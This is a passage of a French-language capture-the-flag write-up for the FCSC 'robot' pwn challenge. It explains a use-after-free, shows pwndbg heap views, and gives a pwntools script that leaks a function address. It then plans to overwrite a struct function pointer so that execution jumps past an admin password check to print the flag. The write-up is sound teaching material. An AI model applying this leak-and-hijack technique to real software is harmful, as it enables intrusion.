+</span></span></code></pre></div><p>On va commencer par regarder les deux <em>Struct</em>, on a donc une <em>Struct</em> &ldquo;Robot&rdquo; qui contient une variable <em>name</em> de <strong>16 chars</strong>, et deux fonctions <code>makeNoise</code> et <code>move</code>.</p>
+<p>On a ensuite &ldquo;RobotUserGuide&rdquo; qui ne contient qu&rsquo;une variable <em>guide</em> de <strong>32 chars</strong>.</p>
+<p>Globalement, les hypothèses sur les actions des options étaient bonnes, à un petit détail près: la vulnérabilité se situe dans l&rsquo;une d&rsquo;entre elle, plus précisément <strong>l&rsquo;option 3</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous allumez le robot. &#34;</span>);
+</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">move</span>(robot);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s est complètement détruit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">free</span> (robot);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span></code></pre></div><p>On voit qu&rsquo;elle va <em>print</em> du texte (plus ou moins inutile), appeller la fonction <code>move</code> de la struct &ldquo;Robot&rdquo;, en ensuite <strong>free le chunk</strong>. On remarque qu&rsquo;il ne supprime pas le <em>pointeur</em>, une fois que le robot est &ldquo;cassé&rdquo;, il existe toujours un pointeur vers le chunk qui a été <em>free()</em> et le contenu du chunk sera toujours existant.</p>
+<p>C&rsquo;est ici un cas assez classique de <strong>Use-After-Free</strong> (UAF). Il faut maintenant trouver un moyen de leak des valeurs de la <em>heap</em>.</p>
+<p>On peut commencer par regarder le chunk dans <code>pwndbg</code>. On lance le programme puis on crée un robot avec n&rsquo;importe quel nom:</p>
+<p><img alt="2023-05-01-193724_830x462_scrot" src="https://user-images.githubusercontent.com/77807503/235506542-72f6ef85-da08-4b99-aa76-c5f759805dd4.png"></p>
+<p>Maintenant, on fait <strong>CTRL+C</strong> pour interrompre le programme et pouvoir inspecter la <strong>heap</strong>. On va utiliser la commande <em>vis</em> et chercher notre chunk.</p>
+<p><img alt="2023-05-01-193807_1069x1036_scrot" src="https://user-images.githubusercontent.com/77807503/235506564-9c19d43e-f9fb-4c77-b9e5-40dc36fcb91e.png"></p>
+<p>Juste avant le <em>Top chunk</em>, on voit notre <em>Robot</em>, qu&rsquo;on reconnaît graĉe au &ldquo;ChatGPT&rdquo; (le nom donné au robot). On peut donc aussi voir que le chunk ne contient pas seulement le nom du robot, deux autres adresses s&rsquo;y trouvent - on va voir à quoi elles correspondent.</p>
+<p><img alt="2023-05-01-193935_1082x180_scrot" src="https://user-images.githubusercontent.com/77807503/235506579-0b63fc28-4acd-424c-b3dd-eb183e7b732c.png"></p>
+<p>Il s&rsquo;agit des deux fonctions de la <em>Struct</em> ajoutées au moment où on crée notre Robot. Ce sont ces adresses que nous voulont <em>leak</em>.</p>
+<p>Pour le faire, les options <strong>4</strong> et <strong>5</strong> vont nous être utiles. L&rsquo;option <strong>4</strong> nous permet de <em>malloc</em> un chunk d&rsquo;une taille de <strong>32</strong>, et puisque nous savons que nous avons un <strong>Use-After-Free</strong>, ce chunk prendra la place dans l&rsquo;ancien chunk <em>Robot</em> si le robot est détruit avant la création du manuel. Enfin, on pourra lire le manuel avec l&rsquo;option <strong>5</strong>, et puisque cette option lit <em>32 chars</em>, elle va aussi lire les deux adresses qui étaient présentes après le nom du robot.</p>
+<h3 id="tldr-leak">TLDR: Leak</h3>
+<ol>
+<li>Créer un robot (<em>malloc</em>)</li>
+<li>Jouer avec le robot (<em>free</em>)</li>
+<li>Créer un manuel (<em>malloc</em>)</li>
+<li>Lire le manuel (<em>UAF</em>)</li>
+</ol>
+<p>Avec ça, on aura donc les adresses des fonctions <em>bleep</em> et <em>roll</em>. Commençons notre exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./robot&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">2101</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construire</span>(name):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;construire(&#34;</span><span style="color:#f92672">+</span>str(name)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parler</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;parler()&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">supprimer</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;supprimer()&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mode_emploi</span>(text):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;mode_emploi(&#34;</span><span style="color:#f92672">+</span>str(text)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manuel</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;manuel()&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> r
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    supprimer()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> manuel()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    roll <span style="color:#f92672">=</span> u64(leak[leak<span style="color:#f92672">.</span>index(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfc</span><span style="color:#e6db74">&#39;</span>):]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;roll @&#34;</span>, hex(roll))
+</span></span></code></pre></div><p>On commence par créer quelques fonctions qui nous facilitent la communication avec l&rsquo;executable, puis on récupère le leak dans une variable. On peut vérifier le bon fonctionnement du script avec <code>pwndbg</code>:</p>
+<p><img alt="2023-05-01-195650_1363x191_scrot" src="https://user-images.githubusercontent.com/77807503/235506603-b7a42176-5182-4dca-96a5-725d28c91942.png"></p>
+<p>Le script crée un robot avec un nom de <strong>16</strong> chars, le détruit, puis crée un mode d&rsquo;emploi de <strong>16</strong> chars (pour ne pas réecrire les adresses des variables), et lis le manuel pour avoir les <em>leaks</em>. On voit que l&rsquo;adresse affichée est bien celle de la fonction <em>roll</em>.</p>
+<p>En faisant cette fonction, on comprend quelle est la deuxième partie de l&rsquo;exploit: réecrire la valeur d&rsquo;une fonction pour l&rsquo;appeller et obtenir le flag. Mais alors, quelle fonction <strong>de la struct</strong> réecrire, et par quoi?</p>
+<p>L&rsquo;option <strong>2</strong> nous permet de &ldquo;faire parler le robot&rdquo;, concrètement, elle appelle la fonction <code>makeNoise</code>, ce serait donc un bon candidat à réecrire puisqu&rsquo;il ne se passe rien de plus dans cette option.</p>
+<p>Maintenant que nous savons quelle fonction réecrire, par quoi pouvons-nous la réecrire ?</p>
+<p>La fonction <code>admin</code> contient un appel à <code>/bin/cat flag.txt</code> mais elle semble protégée par un mot de passe&hellip; ou l&rsquo;est-elle réellement ? Puisque nous connaissons l&rsquo;adresse de <em>roll</em>, rien ne nous oblige à réecrire <code>makeNoise</code> par l&rsquo;adresse de <code>admin</code>, nous pouvons très bien la réecrire par une adresse plus loin dans <code>admin</code>, de préférence <strong>après</strong> la vérification du mot de passe.</p>
+<p>On peut faire ceci avec <code>pwndbg</code> et notre <em>leak</em> de tout à l&rsquo;heure, on va commencer par désassembler la fonction <code>admin</code> pour savoir où <em>jump</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>disass admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function admin:
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x90</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13e2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>],rdi
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR fs:<span style="color:#ae81ff">0x28</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>],rax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>:	xor    eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13ff</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1402</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b10c0</span> <span style="color:#f92672">&lt;</span>strlen<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1407</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:	mov    rcx,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b140a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;</span>:	lea    rdx,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b140e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1415</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;</span>:	mov    rsi,rcx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1418</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b141b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1090</span> <span style="color:#f92672">&lt;</span>SHA256<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1420</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1427</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:	jmp    <span style="color:#ae81ff">0x55a4252b145f</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1429</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:	mov    eax,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b142c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">85</span><span style="color:#f92672">&gt;</span>:	cdqe   
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b142e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	movzx  eax,BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1433</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;</span>:	movzx  eax,al
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1436</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">95</span><span style="color:#f92672">&gt;</span>:	mov    edx,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1439</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:	add    edx,edx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b143b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	movsxd rdx,edx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b143e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:	lea    rcx,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1442</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">107</span><span style="color:#f92672">&gt;</span>:	add    rcx,rdx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1445</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>:	mov    edx,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1447</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc5f</span>]        <span style="color:#75715e"># 0x55a4252b20ad</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b144e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">119</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rcx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1451</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">122</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1456</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">127</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b10d0</span> <span style="color:#f92672">&lt;</span>sprintf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b145b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">132</span><span style="color:#f92672">&gt;</span>:	add    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b145f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>:	cmp    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x1f</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1463</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">140</span><span style="color:#f92672">&gt;</span>:	jle    <span style="color:#ae81ff">0x55a4252b1429</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1465</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">142</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1469</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">146</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2bb0</span>]        <span style="color:#75715e"># 0x55a4252b4020 &lt;encrypted&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1470</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">153</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1473</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">156</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1120</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1478</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">161</span><span style="color:#f92672">&gt;</span>:	test   eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b147a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">163</span><span style="color:#f92672">&gt;</span>:	jne    <span style="color:#ae81ff">0x55a4252b14b6</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b147c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">165</span><span style="color:#f92672">&gt;</span>:	mov    ecx,<span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1481</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>:	lea    rdx,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc2a</span>]        <span style="color:#75715e"># 0x55a4252b20b2</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1488</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">177</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc2c</span>]        <span style="color:#75715e"># 0x55a4252b20bb</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b148f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">184</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc25</span>]        <span style="color:#75715e"># 0x55a4252b20bb</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1496</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">191</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b149b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">196</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1070</span> <span style="color:#f92672">&lt;</span>execl<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">201</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc1d</span>]        <span style="color:#75715e"># 0x55a4252b20c4</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">208</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1140</span> <span style="color:#f92672">&lt;</span>perror<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">213</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">218</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1050</span> <span style="color:#f92672">&lt;</span>exit<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc0d</span>]        <span style="color:#75715e"># 0x55a4252b20ca</span>
